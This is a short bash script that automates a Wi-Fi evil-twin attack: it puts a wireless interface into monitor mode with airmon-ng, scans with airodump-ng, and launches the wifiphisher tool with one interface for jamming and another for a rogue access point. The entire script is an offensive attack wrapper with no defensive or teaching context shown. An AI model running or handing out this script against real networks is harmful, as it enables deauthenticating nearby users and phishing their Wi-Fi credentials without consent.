#! /bin/bash

echo Starting airmon-ng and airodump-ng
echo What is the name of your monitor interface wlan0, wlan1 etc
read -p 'Interface: ' invar
airmon-ng start $invar && airmon-ng check kill ${invar}mon
airodump-ng ${invar}mon
airmon-ng stop ${invar}mon
echo What is the name of your Rogue AP interface wlan1, wlan2 etc
read -p 'Rogue AP Interface: ' rapvar
ifconfig $invar up && ifconfig $rapvar up
cd wifiphisher
python wifiphisher.py -jI $invar -aI $rapvar
$SHELL
